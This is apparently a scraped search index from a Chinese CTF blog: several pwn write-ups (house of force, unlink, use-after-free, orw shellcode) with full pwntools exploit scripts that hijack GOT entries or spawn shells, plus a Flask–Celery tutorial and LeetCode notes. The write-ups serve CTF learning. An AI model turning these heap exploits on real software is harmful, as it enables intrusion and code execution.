72b728b2afb103ef5c44ddff3a0b5c6f0adb6c28ed0ce48e955e5a801274ca4c85a732e77758028d61face50493e859cb60445782a7d50a5e17eef78ddfc276f669a61fe3a5d0a0c9f4ac2f13241ccaa32c4709c8db3c215d2078f55e493559a7f0833a1593d49bc8ea5265df3e2ec9e663d6c72470e6339233f02f89e64a0d01a390dedc4b8b9f79d9c5ea2fae3f547014dee7e44fdd965faa8fe5793f2464633c6a676841aa7f3ca5e6884a0e32542522a0eba194ea13db43378e449711f10c5d5950ea0f6d228e6cedb99884cab3ff73b1dc81450eeb7720f4f0dfcd8482674ad1a280711350f0235af6ce66e8d6033c8932871e33bb3b6fb1e50ed98e98b28595a73ed4ebbf534b73b7a99a33db6e8fe44cc3510ba3eeef109f98e5443bfcd05bd3e60eedd70093f0132c492045effb672fe71befd1863e2867803ad01ce87c15e4eec5da98ba9a720f7ba3ae4efa782b7bdaa5bea316ba903ffcbeb3be27ee47d9c1db5684a7ef86c7e261022867983298c8d63a12ced7b51714e5964e8dcfcb931320661b1bd6a1819046192d0cd190a4dca27444263b36320b2640cf125657e58072c3b5c2aea0eef080d3331cb9664e927f097ba0fef82bebbf1f3c2c460f1f1e35a8fda0bf085f039d8cc0d2cf57ed2fd8984606d067d82d3aea531869e5f18ce0475eb7b15c208662179e029da64a15bd6290024d7d5eef80517ab89cbfa76aa3484a3dbdf86b42ea9e87e358cf7a92e48b34b9c1017a6836d05006455eee4d205c28b141d47966b2db772fb5c3dd1373d1816f1e8e81e4390dd97b298d1164181b2a6d8f448dd1bbe6808ac05aec4411d06e83d564dae5bb40f88c603fa9c5fb16b6d149e972845a69452d5cac15c815d40221e4ac28d3f029c4d81672f4518a43ae199c89424396069bfca977dc26120265766cb99e433013f54610d5df2401c2c51f3a6c4cfe96b5790b3b6d8a3bdf154d81875d4fe7b7abcc0aaff6bc1270713eb16536370364fca482df7d97b5d99f51a81d12d2c1df0f1653ce3014ebc01237d208d000b86769b10d0176970aee88f7dcaf2b3f425763440727b0d748243047231156f4cc0e47843295be4822ba25cd1f33639d045da54d3475e245e2b89fe74c8d517c044f146d61444e76ab6c29a49523cdd1ec1bb6cbb14c39fbf1895cb87114422b9f9b497447869ff6cb35ada6f2892442b54c02b4e0bf45f2d035f946ec930bcb580584118a1338b18a01865e507d9aaef3eec3686b77ebec6cff1d98261f5618003a8ddf17e955657622d62f93d9c7d5c6b18d3b66d0e2a2dee742985220a4b49a40720f433ad0c35ee257adf8d2367290034e759a87f8f8fc541ade18d2eaeddbc7f4e56828488c85a710717e78785bdd2ebdd491a52fa2ed99df75a7b2d2b27d2c5181d82b8c3a033256a7df8dadc82047556f582946872f907b9db7f8169393791aded7c0f769c174d813c90483baf0a558297b048bf848f23d0bae7cd75db6e378b0ac559c973ecfbb2a3b31e53862fe92b788e39894cfae2507180617a7fc683f1f0c6219da21eb5b6c56f1ac589c45cd5f8d1e1144c9a7345c8ac13f4d921ebe80dff578aa30415f3231ee9e2e7e3ce42527c7df5ae8c5dbb76643020b36d328a28305a3ce8d7d743a6dd8c535f91795598f0e22624dd0b9e672343045982c6433b1a86d2fdd7e3d04dd0b05404af1a0a9ecdc48747423796658659356d7c688d3f9379349c500f048f0a1798cbcba83edb4e7002e8f032b7eb612221496c24adaa725b48454600637a6022cc1671c055a2295833e22da054abb0ceb3bcd62020767919a6e3281659294a2f602cce101d0107716f161f36b3fd96f9f616d7a9956410623f587ac57d06e0257159f4c9623784df07d50ccf66cc69b72377bbfbc46cf35bbf14a658d391fcfc59a56689560309dcf1202f2e2ca0123c9c62357d15dd7ec8673426cf0fe9d69f3243d3259fa9b Pease input your password","link":"/2021/12/26/diary/"},{"title":"gyctf_2020_force","text":"house of force,realloc 调整栈帧 # 思路 house of force 改 top chunk，劫持 malloc_hook 为 one_gadget 拿 shell # EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *# r = remote(&quot;node4.buuoj.cn&quot;, 26964)r = process(&quot;./gyctf_2020_force&quot;)context.log_level = 'debug'elf = ELF(&quot;./gyctf_2020_force&quot;)libc = ELF('./libc-2.23.so')one_gadget_16 = [0x45216,0x4526a,0xf02a4,0xf1147]def add(size, content): r.recvuntil(&quot;2:puts\\n&quot;) r.sendline('1') r.recvuntil(&quot;size\\n&quot;) r.sendline(str(size)) r.recvuntil(&quot;bin addr &quot;) addr = int(r.recvuntil('\\n').strip(), 16) r.recvuntil(&quot;content\\n&quot;) r.send(content) return addrdef show(index): r.recvuntil(&quot;2:puts\\n&quot;) r.sendline('2')libc.address = add(0x200000, 'chunk0\\n') + 0x200ff0success('libc_base'+hex(libc.address))heap_addr = add(0x18, 'a'*0x10+p64(0)+p64(0xFFFFFFFFFFFFFFFF))success(&quot;heap_addr:&quot;+hex(heap_addr))top = heap_addr + 0x10# gdb.attach(r)malloc_hook = libc.sym['__malloc_hook']success(&quot;malloc_hook&quot;+hex(malloc_hook))one_gadget = one_gadget_16[1] + libc.addressrealloc = libc.sym[&quot;__libc_realloc&quot;]offset = malloc_hook - topsystem = libc.sym['system']bin_sh = libc.search('/bin/sh').next()success(&quot;system:&quot; + hex(system))success(&quot;bin_sh&quot; + hex(bin_sh))add(offset-0x30, 'aaa\\n')add(0x10, 'a'*8+p64(one_gadget)+p64(realloc+0x10))r.recvuntil(&quot;2:puts\\n&quot;)r.sendline('1')r.recvuntil(&quot;size\\n&quot;)r.sendline(str(20))r.interactive()","link":"/2022/02/27/gyctf_2020_force/"},{"title":"flask配置celery异步任务","text":"flask 配置 celery 异步任务 # 前言# 转载自：https://www.cnblogs.com/wxhou/p/14399237.html 在使用 flask 开发的时候，接口的返回需要很少的时间，所以我们需要将一些耗时的任务，放到异步后台去处理，例如：发送邮件，耗时的 CPU 任务等。在 python web 框架中 celery 这个库，可能是最合适的。 由于我使用 flask 的时间比较多，但是当我想把 celery 很好的与 flask 进行集成的时候，却发现并不是那么如意。花费了很久的时间去实践最后却是各种报错。出现了循环导入、app 上下文、tasks not found 等问题，尝试了种种却总是不如人意。 好在功夫不负有心人，在结合官方文档并查阅了大量资料后，终于把 celery 很好得集成在了 flask 项目中。我在这里记录一下，同时也希望对你们有所帮助。 # 配置# 开发环境 Windows10 python 3.8.6 flask 2.0.x celery 5.x broker redis pool eventlet # simple 模式# 由于 celery 5.0 后推荐小写模式，与 flask config 大写规范有冲突，所以我们当同目录下创建一个 celeryconfig.py 文件 123celeryconfig.pybroker_url='redis://127.0.0.1:6379/1'result_backend='redis://127.0.0.1:6379/2' flask simple 模式。 12345678910111213141516171819202122232425simple.pyfrom flask import Flaskfrom celery import Celeryimport celeryconfigapp = Flask(__name__)celery_app = Celery(app.import_name, broker=celeryconfig.broker_url, backend=celeryconfig.result_backend)celery_app.config_from_object(celeryconfig)@celery_app.task(name='simple/add2')def add2(x, y): return x + y@app.route('/')def index(): results = add2.delay(3, 5) return str(results.wait())if __name__ == '__main__': app.run(debug=True) 这些就是单文件模式的代码，这其中我们添加了一个任务 add2 ，然后启动 flask。 1python simple.py 由于 celery 和 flask 是同级别的 app，所以我们需要一个新的窗口启动 celery，加入 - P 参数指定异步 worker eventlet 1celery -A simple.celery_app worker -l info -P eventlet 当我们启动 celery 之后。看到最后一行的 ready 的时候，说明我们的 celery 已经启动成功了。 然后再看有下面标识说明我们的任务已经被添加成功了。 12[tasks] . simple/add2 访问网址：http://127.0.0.1:5000/ 同时我们查看一下 celery 的窗口： simple 模式就结束了 # Factory 模式# 当然我们如果用 flask 写一个稍微复杂的东西的话，其实工厂模式我们应该用的更多。下面我们一起来看看工厂模式中的配置。 # 目录结构# 首先我们先规划一个 flask+celery 的目录结构。然后创建下面的文件： 1234567891011.├── app│ ├── __init__.py ——app主体文件│ ├── celeryconfig.py ——celery配置文件│ ├── config.py ——flask配置文件│ ├── models.py ——模型文件│ ├── tasks.py ——后台任务│ └── views.py ——视图文件├── data.db├── .flaskenv ——flask环境变量└── server.py ——运行文件 我们先创建一个注册 celery 的函数，主要功能是使用 flask 应用上下文。 123456789def register_celery(celery, app): class ContextTask(celery.Task): abstract = True def __call__(self, *args, **kwargs): with app.app_context(): return self.run(*args, **kwargs) celery.Task = ContextTask 然后我们创建 create_app 函数，将写好的注册 celery 函数加进去。 12345678def create_app(**kwargs): app = Flask(__name__) app.config.from_pyfile('config.py') db.init_app(app) register_celery(celery=kwargs.get('celery'), app=app) # &gt;&gt; 注册celery register_blueprints(app) register_commands(app) return app 上面这些都是我们在 __init__ 文件中创建的，下面我们来创建 celery 的 app 打开 server.py 123456789101112131415from celery import Celeryfrom app import create_app, celeryconfigdef make_celery(app_name): celery = Celery(app_name, broker=celeryconfig.broker_url, backend=celeryconfig.result_backend) celery.config_from_object(celeryconfig) return celerymy_celery = make_celery(__name__)app = create_app(celery=my_celery) 我们把 celery 配置文件和 flask 工厂应用导入进来。然后创建 make_celery 函数生成 celery 应用。 生成 celery 应用后把 celery 传入到 flask 应用函数中去。这样把生成和注册分开写，解决了循环导入的问题。 接着我们创建一个 tasks.py 文件。 12345678910from server import my_celeryfrom .models import db, Message@my_celery.task()def add2(msg): message = Message(details=msg) db.session.add(message) db.session.commit() return &quot;success&quot; 从 server 文件中导入 celery 应用，然后创建任务。 然后在视图中引用任务。 1234567891011121314151617181920from flask import Blueprint, jsonifyfrom .models import db, Messagefrom .tasks import add2th = Blueprint('', __name__)@th.route('/')def index(): res = add2.delay(&quot;hello word&quot;) return jsonify(res.wait())@th.get('/msgs')def msg_list(): messages = Message.query.all() results = [] for message in messages: results.append(message.to_json()) return jsonify(results) celery 的任务可以通过 delay， 方法调用，参数在 delay 中直接传入。 详细介绍： # celery 文档# 这些 API 定义了标准的执行选项集，也就是下面这三个方法： apply_async(args[, kwargs[, …]]) 发送一个任务消息。 delay(*args, **kwargs) 直接发送一个任务消息，但是不支持运行参数。 calling( __call__ ) 应用一个支持调用接口（例如，add (2,2)）的对象，意味着任务不会被一个 worker 执行，但是会在当前线程中执行 (但是消息不会被发送)。 速查表 T.delay(arg, kwarg=value) 调用 apply_async 的快捷方式（.delay (_args, *_kwargs) 等价于调用 .apply_async (args, kwargs)）。 T.apply_async((arg,), {'kwarg': value}) T.apply_async(countdown=10) 从现在起，十秒内执行。 T.apply_async(eta=now + timedelta(seconds=10)) 从现在起十秒内执行，指明使用 eta。 T.apply_async(countdown=60, expires=120) 从现在起一分钟执行，但在两分钟后过期。 T.apply_async(expires=now + timedelta(days=2)) 两天内过期，使用 datetime 对象。 例子 delay() 方法就像一个很规则的函数，很方便去调用它： 1task.delay(arg1, arg2, kwarg1='x', kwarg2='y') 用 apply_async() 替代你写的： 1task.apply_async(args=[arg1, arg2], kwargs={'kwarg1': 'x', 'kwarg2': 'y'}) 尽管运行十分方便，但是如果像设置额外的行参数，你必须用 apply_async # 运行一下# 运行之前我们需要先创建一个 .flaskenv 文件，指定以下我们的 FLASK_APP 环境变量是 server.py 1FLASK_APP=server.py 好了之后，启动 flask 1flask run 启动 celery 1celery -A server.my_celery worker -l info -P eventlet 老规矩，看一下任务注册成功没 12[tasks] . app.tasks.add2 我们打开浏览器查看 可以看到执行成功了。再看看命令行。 任务已经成功的执行了。 就这样我们弄好了 flask+celery 项目的配置，并成功执行了任务。 （待补充 django+celery)","link":"/2022/02/13/flask%E9%85%8D%E7%BD%AE%E5%BC%82%E6%AD%A5%E4%BB%BB%E5%8A%A1/"},{"title":"jarvisoj_level6_x64","text":"double free，unlink 覆写 got 表 # 0x01 程序分析 主函数： 之后 sub_400A49：用户初始堆分配 sub_400998：要求输入一个操作选项 sub_400B14：遍历索引打印所有标号和记录内容 sub_400BC2: 要求输入记录的内容长度和记录内容，然后检测输入长度是否超过最大值，正常则 malloc 一个堆块用来存储记录，然后按输入的长度读取记录内容到堆块： sub_400D87：编辑，是一个 realloc，可以泄露堆溢出 堆 v2 也就是 size 进行了要求，在最后的 sub_40085D 函数中进行了内容读取，这里没有将字符串结束符读进来因此可以进行内存泄露，泄露偏移和 system 地址。 sub_400f7d：删除功能，依据标号找到相应的记录然后重置索引表为未使用态并 free 掉堆块，存在 double free 漏洞 unlink 思路 利用 unsorted bin 的 fd 指针分别泄露出 heap 地址和 libc 地址，这样就得到了最初那个 0x1820 大小的 chunk 的地址 利用 realloc 功能来构造 unlink 条件，结合 uaf 漏洞，修改某个 ptr 为 ptr - 0x18 ，这个 ptr 在 0x1820 堆块上 利用 edit 修改 atoi@got 为 system 地址 输入 /bin/sh 拿 shell # 0x02 漏洞利用 添加四个 Note，释放 note [0] 和 note [2]，此时 note [0] 的 bk 指向 note [2] 的 chunk，note [2] 的 bk 指向 main_arena+0x58（两个 chunk 都进入 unsorted bin） 再次添加 2 个 note，payload 长度为 8，注意结尾不要是 \\x00 利用 list 泄露 NOTE 管理块的地址和 libc 基地址 将四个 note 全部删除 添加一个 note，长度要能包含进最开始的 3 个 note 的 chunk 伪造一个 chunk，大小为 0x80，fd 为 note [0]-0x18， bk 为 note [0]-0x10，利用 unlink 把 NOTE 管理块中 note [0] 的地址改为 note [0]-0x18 把 note [0] 改为 atoi 的 got，然后编辑 note [0]，改为 system 地址 输入 /bin/sh，获取 shell 先申请 4 个 chunk，然后 free (0) 和 free (2)，防止合并；然后在申请 2 个 chunk，只写入 8 字节，就可以 leak 出 heap 和 libc 的基地址； 在 heap 基地址偏移 0x30 的地方有我们需要的 NOTE 管理块的地址 # 0x03 EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = 'debug'p=process('./freenote_x64')# p=remote('node4.buuoj.cn',28735)libc=ELF('libc-2.23.so')e=ELF('./freenote_x64')def List(): p.recvuntil('Your choice: ') p.sendline('1')def new(cont): p.recvuntil('Your choice: ') p.sendline('2') p.recvuntil('Length of new note: ') p.sendline(str(len(cont))) p.recvuntil('Enter your note: ') p.sendline(cont)def edit(num,cont): p.recvuntil('Your choice: ') p.sendline('3') p.recvuntil('Note number: ') p.sendline(str(num)) p.recvuntil('Length of note: ') p.sendline(str(len(cont))) p.recvuntil('Enter your note: ') p.sendline(cont)def delete(num): p.recvuntil('Your choice: ') p.sendline('4') p.recvuntil('Note number: ') p.sendline(str(num))new('a'*0x80)new('b'*0x80)new('c'*0x80)new('d'*0x80)delete(0)delete(2)new('11111111')new('22222222')List()p.recvuntil('11111111')s=p.recvuntil('\\x0a')chunk2=u64(s[:-1].ljust(8,'\\x00'))heap_addr=chunk2-0x1940point_chunk0=heap_addr+0x30print hex(heap_addr)delete(1)delete(2)delete(3)#unlinkpayload = p64(0x90)+p64(0x81)+p64(point_chunk0-0x18)+p64(point_chunk0-0x10) payload +='a'*0x60payload += p64(0x80)+p64(0x90)payload +='c'*0x80+p64(0x90)+p64(0x121)edit(0,payload)delete(1)#free_got-&gt;systemfree_got_addr=e.got['free']print hex(free_got_addr)payload2=p64(4)+p64(1)+p64(0x8)+p64(free_got_addr)payload2+=p64(1)+p64(0x8)+p64(chunk2)payload2+=p64(1)+p64(0x8)+p64(e.got['atoi'])payload2+='\\x00'*(0x120-80)edit(0,payload2)p.recvuntil('Your choice: Invalid!\\n')List()p.recvuntil('2. ')atoi_in_server=u64(p.recvuntil('\\x0a')[:-1].ljust(8,'\\x00'))system_in_server=libc.symbols['system']+atoi_in_server-libc.symbols['atoi']#gdb.attach(proc.pidof(p)[0])payload3=p64(system_in_server)edit(0,payload3)edit(1,&quot;/bin/sh\\x00&quot;)delete(1)p.interactive() # 0x04 参考文章 https://blog.csdn.net/weixin_45427676/article/details/105495608 https://www.cnblogs.com/LynneHuan/p/14869403.html","link":"/2022/01/13/jarvisoj_level6_x64/"},{"title":"hitcontraining_unlink","text":"ulink # hitcontraining_unlink # 程序分析 检查：64 位程序，开了 NX 和 canary 存在 magic 函数（实际上并没什么用） 查看主函数及各菜单功能 show() add() change() 在 change_item () 函数中并没有对输入的内容 size 进行检查，存在堆溢出 remove() # 思路 unlink 基本知识 新版 unlink 要求 // 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致 (size 检查) if (__builtin_expect (chunksize§ != prev_size (next_chunk§), 0)) malloc_printerr (“corrupted size vs. prev_size”); \\ // 检查 fd 和 bk 指针 (双向链表完整性检查) if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, “corrupted double-linked list”, P, AV); \\ //largebin 中 next_size 双向链表完整性检查 if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) malloc_printerr (check_action, “corrupted double-linked list (not small)”, P, AV); 利用思路： 构造 fake_chunk 通过 unlink，把 chunk 移到存储 chunk 指针的内存处 覆盖 chunk 0 指针为 atoi@got 表地址并泄露 覆盖 atoi 的 got 表为 system 函数地址。 给出参数 ‘/bin/sh’，调用 atoi 函数拿 shell。 # EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#coding:utf-8from pwn import *context.log_level = 'debug'r = remote('node4.buuoj.cn',27663)# r=process('./bamboobox')elf = ELF('./bamboobox')libc = ELF('./libc-2.23.so')def add(length,name): r.recvuntil(&quot;:&quot;) r.sendline('2') r.recvuntil(':') r.sendline(str(length)) r.recvuntil(&quot;:&quot;) r.sendline(name) def edit(idx,length,name): r.recvuntil(':') r.sendline('3') r.recvuntil(&quot;:&quot;) r.sendline(str(idx)) r.recvuntil(&quot;:&quot;) r.sendline(str(length)) r.recvuntil(':') r.sendline(name) def delete(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;4&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx)) def show(): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;)add(0x40,'aaaaaaaa')add(0x80,'bbbbbbbb')add(0x80,'cccccccc')#gdb.attach(r)ptr = 0x6020C8 #存放chunk指针的数组在bss段上的地址#这里我们绕过第一个检查 (检查p和其前后的chunk是否构成双向链表)fake_chunk = p64(0) + p64(0x41) #fake_chunk headerfake_chunk += p64(ptr-0x18) + p64(ptr-0x10) #fake_chunk fd bkfake_chunk += 'C'*0x20fake_chunk += p64(0x40) # 1的presize fake_chunk += p64(0x90) # 1的sizeedit(0,0x80,fake_chunk)delete(1) #前向合并，合并0中的fake_chunk 放入 unsorted bin 中 ,同时 ptr = &amp;itemlist0_ptr -0x18payload = p64(0) * 2payload += p64(0x40) + p64(elf.got['atoi']) #覆盖的itemlist[0]-&gt;ptr 为atoi_gotedit(0,0x80,payload)show()r.recvuntil('0 : ')atoi = u64(r.recv(6).ljust(8,'\\x00'))libc_base = atoi - libc.symbols['atoi']system = libc_base + libc.symbols['system']edit(0,8,p64(system))r.sendlineafter('Your choice:','/bin/sh\\x00')r.interactive() # 参考文章 https://blog.csdn.net/mcmuyanga/article/details/113105091","link":"/2022/01/19/hitcontraining_unlink/"},{"title":"堆漏洞uaf","text":"uaf # 知识点 UAF 漏洞全称为 use after free，即释放后重用。漏洞产生的原因，在于内存在被释放后，但是指向指针并没有被删除，又被程序调用。比较常见的类型是 C 对象，利用 UAF 修改 C 的虚函数表导致的任意代码执行。 # 例题 # [BUUCTF]PWN——hitcontraining_uaf checksec 检查，开了 NX 保护，32 位 (1) add note add 会申请两次内存，第一次申请 8 个字节，前四个字节指向 print_note_content 这个函数，后四个字节指向我们写入的字符串 (count 会加 1) (2) delete note 只释放了堆块里的内容但没有将指针置 0，存在 uaf 漏洞，并未指向 NULL (3) print note 调用 add 申请的第一个 8 个字节中的前四个字节指向的函数，打印 add 创建的第二个 chunk 里的值 （4） shell fastbin 是单向链表遵循先进后出原则，申请 A,B 两个堆块后，先释放 A ，后释放 B，会在 fastbin 里形成链，此时，再次申请一个大小为 0x8 的内存 C，并写入 shellcode 地址，那么第一个 8 个字节 C 就指向 B，第二个 8 个字节 C 指向 A，这时候我们写入的内容就会覆盖原有的，但原来的指针仍指向它，因而可以更改 print_note_content 函数为我们想要执行的函数。 在 add 中，我们只能对 content 部分进行操作，无法对 print_note_content 对应的部分即 put 段进行操作，所以我们要想办法，操作 put 段 1根据put段和content段中大小的不同，如果要申请到put段，payload大小应该为0x8，由于先进后出原则，先释放A，后释放B，此时第三次申请的put段指向B的put，content段指向A的put，content写入magic，调用print_note(0)时就调用了magic 申请过程堆块变化： add: free 后： 再次申请，写入 shell 先进后出原则 wp: 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *r = process('./hacknote')# r = remote('node4.buuoj.cn',27609)shell_add = 0x8048945def add(size,content): r.sendlineafter('choice :','1') r.sendlineafter('Note size :',str(size)) r.sendlineafter('Content :',content)def delete(idx): r.sendlineafter('choice :','2') r.sendlineafter('Index :',str(idx))def printf(idx): r.sendlineafter('choice :','3') r.sendlineafter('Index :',str(idx))add(48,'aaaa')add(48,'bbbb')#gdb.attach(r)delete(0)delete(1)add(8,p32(shell_add))printf(0)#第二种思路double free#add(8,'aaaa')#delete(0)#delete(0)#add(40,'aaaa')#add(8,p32(shell_addr))#printf(1)r.interactive() # 参考文章 https://blog.csdn.net/mcmuyanga/article/details/108454183?ops_request_misc=%7B%22request%5Fid%22%3A%22163714805316780261940769%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=163714805316780261940769&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2allsobaiduend~default-2-108454183.first_rank_v2_pc_rank_v29&amp;utm_term=hitcontraining_uaf&amp;spm=1018.2226.3001.4187 IE 漏洞学习笔记（二）：UAF 释放后重用 One_gadget 和 UAF 结合利用堆溢出漏洞研究","link":"/2021/11/17/hitcontraining_uaf/"},{"title":"leetcode数据结构刷题（二）","text":"二叉搜索树相关 # 0x01 二叉树最底层最左边的值 给定一个二叉树的 根节点 root ，请找出该二叉树的 最底层 最左边 节点的值。 假设二叉树中至少有一个节点。 12输入: [1,2,3,4,null,5,6,null,null,7]输出: 7 # 法一：前序遍历 DFS 使用 DFS 递归遍历树的所有节点，记录当前节点的层级 level 与已遍历节点的最大层级 maxLevel 每当 level 超过 maxLevel 时，将当前节点赋值给 res，另外更新 maxLevel 遍历完成后，res 就是要找的节点，返回该节点的值即可 遍历到新的一层的第一个节点为最底层，最左边的节点 12345678910111213141516171819class Solution {public: int res = 0; int maxlevel=-1; int findBottomLeftValue(TreeNode* root) { dfs(root,0); return res; } void dfs(TreeNode * root,int level){ if(root==NULL) return ; if(level&gt;maxlevel){ res = root-&gt;val; maxlevel = level; } dfs(root-&gt;left,level+1); dfs(root-&gt;right,level+1); } }; # 法二：层序遍历 BFS 更新每层第一个元素值，取最后一次更新值 12345678910111213141516171819202122232425262728293031/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode() : val(0), left(nullptr), right(nullptr) {} * TreeNode(int x) : val(x), left(nullptr), right(nullptr) {} * TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {} * }; */class Solution {public: int findBottomLeftValue(TreeNode* root) { queue&lt;TreeNode*&gt; q; q.push(root); int leftnode; while(!q.empty()){ int size = q.size(); for (int i=size;i;i--){ auto node = q.front(); if(i==size) leftnode = node-&gt;val; q.pop(); if(node-&gt;left) q.push(node-&gt;left); if(node-&gt;right) q.push(node-&gt;right); } } return leftnode; }}; # 0x02 往完全二叉树添加节点 完全二叉树是每一层（除最后一层外）都是完全填充（即，节点数达到最大，第 n 层有 2n-1 个节点）的，并且所有的节点都尽可能地集中在左侧。 设计一个用完全二叉树初始化的数据结构 CBTInserter，它支持以下几种操作： CBTInserter (TreeNode root) 使用根节点为 root 的给定树初始化该数据结构； CBTInserter.insert (int v) 向树中插入一个新节点，节点类型为 TreeNode，值为 v 。使树保持完全二叉树的状态，并返回插入的新节点的父节点的值； CBTInserter.get_root () 将返回树的根节点。 示例 1： 123456输入：inputs = [&quot;CBTInserter&quot;,&quot;insert&quot;,&quot;get_root&quot;], inputs = [[[1]],[2],[]]输出：[null,1,[1,2]]输入：inputs = [&quot;CBTInserter&quot;,&quot;insert&quot;,&quot;insert&quot;,&quot;get_root&quot;], inputs = [[[1,2,3,4,5,6]],[7],[8],[]]输出：[null,3,4,[1,2,3,4,5,6,7,8]] # 使用队列完成二叉树的层序遍历 通过观察可以发现新节点需要插入层次遍历时第一个出现的 “不完整的节点” （即不同时具有左右孩子节点）。如图中所示，绿色代表当前队列中的节点（规定节点的左右孩子均存在时才将它们一起先后压入队列)，当遍历到 “不完整的节点” 就找到了新节点插入的节点位置，“不完整的节点” 位于队列的头部。在 CBTInserter 函数中实现该过程，找到插入的位置，以及得到当前的队列。 插入操作时，先后检查队列头部节点的左右孩子，若左孩子缺失则将新节点插入其左孩子，右孩子缺失则插入右孩子。当队列头部节点的左右孩子都存在，则将其左右孩子压入队列尾部，队列的头部节点出队列，因为此时它已不是 “不完整的节点” 。更新后的队列的头部节点将是下一个 “不完整的节点”。按照规则依次处理接下来的插入操作。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode() : val(0), left(nullptr), right(nullptr) {} * TreeNode(int x) : val(x), left(nullptr), right(nullptr) {} * TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {} * }; */class CBTInserter {private: queue&lt;TreeNode*&gt; que; TreeNode* root;public: CBTInserter(TreeNode* root) { this-&gt;root = root; que.push(root); while (que.front()-&gt;left != nullptr &amp;&amp; que.front()-&gt;right != nullptr) { que.push(que.front()-&gt;left); que.push(que.front()-&gt;right); que.pop(); } } int insert(int v) { TreeNode* node = new TreeNode(v); TreeNode* fa = que.front(); if (fa-&gt;left == nullptr) { fa-&gt;left = node; } else { fa-&gt;right = node; que.push(fa-&gt;left); que.push(fa-&gt;right); que.pop(); } return fa-&gt;val; } TreeNode* get_root() { return this-&gt;root; }};/** * Your CBTInserter object will be instantiated and called as such: * CBTInserter* obj = new CBTInserter(root); * int param_1 = obj-&gt;insert(v); * TreeNode* param_2 = obj-&gt;get_root(); */ 时间复杂度为 O (n)，队列中存的节点数为 O (n)，所以空间复杂度为 O (n)。","link":"/2022/01/30/leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C%EF%BC%89/"},{"title":"pwnable.tw orw","text":"prctl 内核沙箱机制 # 知识点 prctl seccomp 相当于内核中的一种安全机制，正常情况下，程序可以使用所有的 syscall，但是当劫持程序流程之后通过 exeve 来呼叫 syscall 得到 shell 时过滤掉某些 syscall，只允许使用部分 syscall。 seccomp 是 secure computing 的缩写，其是 Linux kernel 从 2.6.23 版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp 安全机制能使一个进程进入到一种 “安全” 运行模式，该模式下的进程只能调用 4 种系统调用（system call），即 read (), write (), exit () 和 sigreturn ()，否则进程便会被终止。 # WP 开启了 canary 本题系统内核只允许使用 sys_open，sys_read，sys_write 第一次调用 prctl 函数 禁止提权，第二次调用 prctl 函数 限制能执行的系统调用只有 open，write，exit 总体思路是：open flag -&gt;read-&gt;write sys_open 1234567push 0x0 #字符串结尾push 0x67616c66 #'flags'mov ebx,esp xor ecx,ecx #0xor edx,edx #0mov eax,0x5 #调用号int 0x80 #sys_open(flags,0,0) sys_read (2,file,0x100) 系统调用号为 3 123456mov eax,0x3; mov ecx,ebx; # ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”mov ebx,0x3; # 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件mov edx,0x100; #对应字节数int 0x80; sys_write (1,file,0x30) 系统调用号为 4 123mov eax,0x4; # eax = sys_writemov ebx,0x1; # ebx = unsigned int fd = 1int 0x80; exp: 1234567891011from pwn import *context(log_level = 'debug', arch = 'i386', os = 'linux')p=remote('node4.buuoj.cn',28836)shellcode=&quot;&quot;shellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; mov ebx,esp;xor edx,edx;int 0x80;')shellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')shellcode += asm('mov eax,0x4;mov bl,0x1;mov edx,0x30;int 0x80;')recv = p.recvuntil(':')p.sendline(shellcode)flag = p.recv(100)print flag 12345678910111213141516from pwn import *r = remote('node4.buuoj.cn',28836)context.log_level = 'debug'elf = ELF('orw')shellcode = shellcraft.open('/flag')shellcode += shellcraft.read('eax','esp',100)shellcode += shellcraft.write(1,'esp',100)shellcode = asm(shellcode)r.sendline(shellcode)r.interactive()","link":"/2021/11/17/pwnable.tw_orw/"},{"title":"unlink","text":"堆溢出漏洞 ——unlink 推荐 unlink 基本知识讲解 # 2014 HITCON stkof exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']if args['DEBUG']: context.log_level = 'debug'context.binary = &quot;./stkof&quot;hollkelf = ELF('./stkof')if args['REMOTE']: hollk = remote('127.0.0.1', 7777)else: hollk = process(&quot;./stkof&quot;)log.info('PID: ' + str(proc.pidof(hollk)[0]))libc = ELF('./libc.so.6')head = 0x602140def alloc(size): hollk.sendline('1') hollk.sendline(str(size)) hollk.recvuntil('OK\\n')def edit(idx, size, content): hollk.sendline('2') 